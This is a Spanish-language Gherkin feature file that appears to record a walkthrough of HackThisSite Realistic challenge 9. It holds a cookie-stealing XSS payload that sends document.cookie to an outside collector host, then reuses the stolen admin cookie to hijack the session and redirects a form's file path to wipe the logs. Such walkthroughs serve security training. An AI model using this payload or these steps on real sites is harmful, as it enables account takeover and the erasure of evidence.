# language: es

Característica: resolver reto 9
  Sin utilización de código
  Del sitio hackthissite.org
  De la categoría Realistic
  Con mi usuario Goso

  Antecedentes:
    Dado que estoy Registrado en el sitio hackthissite.org
    Y tengo el sistema operativo Ubuntu 14.04
    Y tengo a la mano un plugin para editar cookies
    Y tengo acceso a internet utilizando mozilla firefox

  Escenario: Primer intento fallido
    Dados varios campos para posible inyección XSS
    Y unas credenciales de un usuario (datos del reto)
    Cuando intento realizar inyecciones XSS en todo el sitio
    Entonces veo que el sitio filtra muy bien las inyeccciones
    Pero veo una posible vulnerabilidad en la página de mensajes privados

  Escenario: Último intento fallido
    Dada una vulnerabilidad en la página de mensajes privados
    Y se implementa una inyección para robar la "cookie" del administrador
    Entonces robo la cookie mediante un sitio creado por mi para robar cookies
    Y el sitio se llama: https://pentestgos.000webhostapp.com/r.php?c=
    Entonces aplico la inyeccion requerida en el campo de mensaje:
    Y va asi window.location='https://pentestgos.000webhostapp.com/joder.php?c='
    Y + document.cookie);
    Y el sitio me muestra por si solo el contenido para ingresar como admin
    Pero no termino el reto ya que me pide borrar el log

  Escenario: Solución exitosa
    Dada la información necesaria para ingresar como administrador
    Y modifico el valor de la cookie actual por el valor del administrador
    Y puedo realizar el pago requerido por el reto
    Y me pide borrar el log
    Cuando veo en la página "Mailing List" un formulario para suscribirse
    Y veo que este envía los correos a un directorio terminado en /addresses.txt
    Y cambio este directorio por el directorio terminado en /logs.txt
    Entonces solucionaré este reto
